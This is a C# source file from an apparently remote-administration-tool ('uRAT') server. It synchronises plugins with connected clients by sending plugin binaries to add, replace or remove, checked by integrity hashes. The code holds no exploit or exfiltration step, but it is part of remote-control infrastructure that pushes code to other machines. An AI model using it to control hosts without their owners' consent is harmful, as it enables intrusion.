using System.Linq;
using uNet2.Channel;
using uNet2.Packet;
using uNet2.SocketOperation;
using uRAT.Server.Plugin.Synchronization.Packets;
using uRAT.Server.Tools.Extensions;

namespace uRAT.Server.Plugin.Synchronization
{
    internal class PluginSynchronizationOperation : SocketOperationBase
    {
        public override int OperationId
        {
            get { return -1; }
        }

        public override void PacketReceived(IDataPacket packet, IChannel sender)
        {
            if (packet is FetchPluginMetadataPacket)
            {
                var mdPacket = packet as FetchPluginMetadataPacket;
                Globals.PluginAggregator.FetchRemotePlugins();
                // No plugins on client side
                if (mdPacket.PluginList.Count == 0)
                {
                    var pluginActionPacket = new PluginActionPacket();
                    foreach (var remotePlugin in Globals.PluginAggregator.LoadedRemotePlugins)
                    {
                        if (!remotePlugin.AssociatedServerPluginHost.Enabled)
                            continue;
                        pluginActionPacket.Actions.Add(new PluginActionPacket.PluginActionData
                        {
                            Action = PluginActionPacket.PluginAction.Add,
                            PluginGuid = remotePlugin.PluginGuid,
                            IntegrityHash = remotePlugin.Hash,
                            PluginData = remotePlugin.Data
                        });
                    }
                    SendPacket(pluginActionPacket);
                }
                else if (mdPacket.PluginList.Count != Globals.PluginAggregator.LoadedRemotePlugins.Count(p => p.AssociatedServerPluginHost.Enabled))
                {
                    var pluginActionPacket = new PluginActionPacket();
                    foreach (var localPlugin in Globals.PluginAggregator.LoadedRemotePlugins)
                    {
                        if (!localPlugin.AssociatedServerPluginHost.Enabled)
                            continue;
                        if (mdPacket.PluginList.FirstOrDefault(p => p.PluginGuid.Equals(localPlugin.PluginGuid)) == null)
                        {
                            pluginActionPacket.Actions.Add(new PluginActionPacket.PluginActionData
                            {
                                Action = PluginActionPacket.PluginAction.Add,
                                PluginGuid = localPlugin.PluginGuid,
                                IntegrityHash = localPlugin.Hash,
                                PluginData = localPlugin.Data
                            });
                        }
                    }
                    CorrectPluginMismatches(mdPacket, ref pluginActionPacket);
                    SendPacket(pluginActionPacket);
                }
                SendPacket(new SynchronizationFinalizationPacket());
            }
        }

        private static void CorrectPluginMismatches(FetchPluginMetadataPacket mdPacket,
            ref PluginActionPacket pluginActionPacket)
        {
            foreach (var remotePlugin in mdPacket.PluginList)
            {
                PluginAggregator.RemoteClientPlugin localPlugin = null;
                try
                {
                    localPlugin =
                        Globals.PluginAggregator.LoadedRemotePlugins.Find(
                            p => p.PluginGuid.Equals(remotePlugin.PluginGuid));
                }
                catch
                {

                }

                // Client has a plugin we don't, remove it
                if (localPlugin == null || !localPlugin.AssociatedServerPluginHost.Enabled)
                {
                    pluginActionPacket.Actions.Add(new PluginActionPacket.PluginActionData
                    {
                        Action = PluginActionPacket.PluginAction.Remove,
                        PluginGuid = remotePlugin.PluginGuid,
                        IntegrityHash = new byte[32],
                        PluginData = new byte[] {0}
                    });
                }
                else if (!localPlugin.Hash.SequenceEquals(remotePlugin.IntegrityHash))
                {
                    pluginActionPacket.Actions.Add(new PluginActionPacket.PluginActionData
                    {
                        Action = PluginActionPacket.PluginAction.Replace,
                        PluginGuid = remotePlugin.PluginGuid,
                        IntegrityHash = localPlugin.Hash,
                        PluginData = localPlugin.Data
                    });
                }
            }
        }


        public override void PacketSent(IDataPacket packet, IChannel targetChannel)
        {

        }

        public override void SequenceFragmentReceived(SequenceFragmentInfo fragmentInfo)
        {

        }

        public override void Disconnected()
        {

        }
    }
}
